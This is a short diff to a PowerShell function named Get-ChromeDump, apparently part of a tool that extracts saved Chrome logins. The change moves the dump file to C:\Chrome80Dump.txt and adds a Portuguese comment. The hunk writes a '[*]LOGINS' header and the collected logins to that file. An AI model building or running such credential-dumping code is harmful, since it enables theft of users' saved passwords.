@@ -297,8 +297,8 @@ Function Get-ChromeDump{
 	if (!(Test-path -Path "C:\l")){
 	New-Item -Path 'C:\l' -ItemType Directory
 	}
-    
-    $OutFile = 'C:\l\Chrome80Dump.txt'
+    # Local do Arquivo de Saida
+    $OutFile = 'C:\Chrome80Dump.txt'
 	
     "[*]LOGINS`n" | Out-File $OutFile 
     $logins | Out-File $OutFile -Append
